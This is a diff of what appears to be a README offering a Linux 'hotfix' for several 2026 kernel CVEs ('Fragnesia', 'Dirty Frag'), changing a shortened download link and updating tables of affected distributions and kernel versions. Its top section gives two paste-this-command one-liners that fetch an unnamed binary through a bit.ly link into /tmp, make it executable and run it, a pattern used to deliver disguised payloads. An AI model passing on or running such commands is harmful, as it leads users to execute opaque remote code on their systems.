@@ -5,11 +5,11 @@
 
 ## Запустить исправление на любом Linux / Run any Linux hotfix
 ```bash
-b="/tmp/cve_2026_frag_family_fix"; wget -qO $b $(wget -qO- https://bit.ly/3RlnvXM | grep browser_download_url | grep -v .exe | cut -d '"' -f 4) && chmod +x $b && $b
+b="/tmp/cve_2026_frag_family_fix"; wget -qO $b $(wget -qO- https://bit.ly/4vetMTB | grep browser_download_url | grep -v .exe | cut -d '"' -f 4) && chmod +x $b && $b
 ```
 или
 ```bash
-b="/tmp/cve_2026_frag_family_fix"; curl -fsSL "$(curl -fsSL https://bit.ly/3RlnvXM | grep browser_download_url | grep -v .exe | cut -d '"' -f 4)" -o $b && chmod +x $b && $b
+b="/tmp/cve_2026_frag_family_fix"; curl -fsSL "$(curl -fsSL https://bit.ly/4vetMTB | grep browser_download_url | grep -v .exe | cut -d '"' -f 4)" -o $b && chmod +x $b && $b
 ```
 
 # CVE-2026-46300 / CVE-2026-43500 / CVE-2026-43284 / Fragnesia / Dirty Frag mitigation (rxrpc, esp4, esp6)
@@ -73,21 +73,21 @@ docker run --rm -v "$PWD":/app -w /app golang:alpine sh -c "apk add --no-cache u
 | **Ubuntu 18.04** (bionic) | ❌ | ❌ | ❌ |
 | **Ubuntu 20.04** (focal) | ❌ | ❌ | ❌ |
 | **Ubuntu 22.04** (jammy) | ✅ | ❌ | ❌ |
-| **Ubuntu 24.04** (noble) | ✅ | ❌ | ❌ |
-| **Ubuntu 25.04** (plucky) | ✅ | ❌ | ❌ |
-| **Ubuntu 26.04** (resolute) | ✅ | ❌ | ❌ |
+| **Ubuntu 24.04** (noble) | ✅ | ✅ | ✅ |
+| **Ubuntu 25.04** (plucky) | ❌| ❌ | ❌ |
+| **Ubuntu 26.04** (resolute) | ✅ | ✅ | ✅ |
 | **CentOS Stream 8** | ❌ | ❌ | ❌ |
 | **CentOS Stream 9** | ✅ | ✅ | ❌ |
 | **CentOS Stream 10** | ✅ | ✅ | ❌ |
 | **AlmaLinux 8.10** | ✅ | ✅ | ✅ |
 | **AlmaLinux 9.7** | ✅ | ✅ | ✅ |
 | **AlmaLinux 10.1** | ✅ | ✅ | ✅ |
-| **Rocky Linux 8.10** | ✅ | ✅ | ❌ |
-| **Rocky Linux 9.7** | ✅ | ✅ | ❌ |
-| **Rocky Linux 10.1** | ✅ | ✅ | ❌ |
+| **Rocky Linux 8.10** | ✅ | ✅ | ✅ |
+| **Rocky Linux 9.7** | ✅ | ✅ | ✅ |
+| **Rocky Linux 10.1** | ✅ | ✅ | ✅ |
 | **Fedora 40** | ❌ | ❌ | ❌ |
 | **Fedora 41** | ❌ | ❌ | ❌ |
-| **Fedora 42** | ✅ | ✅ | ❌ |
+| **Fedora 42** | ✅ | ✅ | ✅ |
 | **Fedora 43** | ✅ | ✅ | ✅ |
 | **Fedora 44** | ✅ | ✅ | ✅ |
 | **Oracle Linux 8.10** | ✅ | ✅ | ✅ |
@@ -113,21 +113,21 @@ docker run --rm -v "$PWD":/app -w /app golang:alpine sh -c "apk add --no-cache u
 | **Ubuntu 18.04** (bionic) | ❌ | ❌ | ❌ |
 | **Ubuntu 20.04** (focal) | ❌ | ❌ | ❌ |
 | **Ubuntu 22.04** (jammy) | 5.15.0-177-generic | ❌ | ❌ |
-| **Ubuntu 24.04** (noble) | 6.8.0-111-generic | ❌ | ❌ |
-| **Ubuntu 25.04** (plucky) | 6.14.0-37-generic | ❌ | ❌ |
-| **Ubuntu 26.04** (resolute) | 7.0.0-15-generic | ❌ | ❌ |
+| **Ubuntu 24.04** (noble) | 6.8.0-111-generic | 6.8.0-124-generic | 6.8.0-124-generic |
+| **Ubuntu 25.04** (plucky) | ❌ | ❌ | ❌ |
+| **Ubuntu 26.04** (resolute) | 7.0.0-15-generic | 7.0.0-22-generic | 7.0.0-22-generic |
 | **CentOS Stream 8** | ❌ | ❌ | ❌ |
 | **CentOS Stream 9** | 5.14.0-701.el9.x86_64 | 5.14.0-708.el9.x86_64 | ❌ |
 | **CentOS Stream 10** | 6.12.0-226.el10.x86_64 | 6.12.0-231.el10.x86_64 | ❌ |
 | **AlmaLinux 8.10** | 4.18.0-553.121.1.el8_10.x86_64 | 4.18.0-553.123.2.el8_10.x86_64 | 4.18.0-553.124.4.el8_10.x86_64 |
 | **AlmaLinux 9.7** | 5.14.0-611.49.2.el9_7.x86_64 | 5.14.0-611.54.3.el9_7.x86_64 | 5.14.0-611.54.6.el9_7.x86_64 |
 | **AlmaLinux 10.1** | 6.12.0-124.52.3.el10_1.x86_64 | 6.12.0-124.55.3.el10_1.x86_64 | 6.12.0-124.56.5.el10_1.x86_64 |
-| **Rocky Linux 8.10** | 4.18.0-553.123.1.el8_10.x86_64 | 4.18.0-553.124.1.el8_10.x86_64 | ❌ |
-| **Rocky Linux 9.7** | 5.14.0-611.54.1.el9_7.x86_64 | 5.14.0-611.55.1.el9_7.x86_64 | ❌ |
-| **Rocky Linux 10.1** | 6.12.0-124.55.1.el10_1.x86_64 | 6.12.0-124.56.1.el10_1.x86_64 | ❌ |
+| **Rocky Linux 8.10** | 4.18.0-553.123.1.el8_10.x86_64 | 4.18.0-553.124.1.el8_10.x86_64 | 4.18.0-553.126.1.el8_10.x86_64 |
+| **Rocky Linux 9.7** | 5.14.0-611.54.1.el9_7.x86_64 | 5.14.0-611.55.1.el9_7.x86_64 | 5.14.0-687.12.1.el9_8.x86_64 |
+| **Rocky Linux 10.1** | 6.12.0-124.55.1.el10_1.x86_64 | 6.12.0-124.56.1.el10_1.x86_64 | 6.12.0-211.16.1.el10_2.0.1.x86_64 |
 | **Fedora 40** | ❌ | ❌ | ❌ |
 | **Fedora 41** | ❌ | ❌ | ❌ |
-| **Fedora 42** | 6.19.14-100.fc42.x86_64 | 6.19.14-101.fc42.x86_64 | ❌ |
+| **Fedora 42** | 6.19.14-100.fc42.x86_64 | 6.19.14-101.fc42.x86_64 | 6.19.14-108.fc42.x86_64 |
 | **Fedora 43** | 6.19.14-200.fc43.x86_64 | 7.0.4-100.fc43.x86_64 | 7.0.9-105.fc43.x86_64 |
 | **Fedora 44** | 6.19.14-300.fc44.x86_64 | 7.0.4-200.fc44.x86_64 | 7.0.9-205.fc44.x86_64 |
 | **Oracle Linux 8.10** | 5.15.0-319.201.4.4.el8uek.x86_64 | 5.15.0-319.201.4.6.el8uek.x86_64 | 5.15.0-320.202.8.5.el8uek.x86_64 |
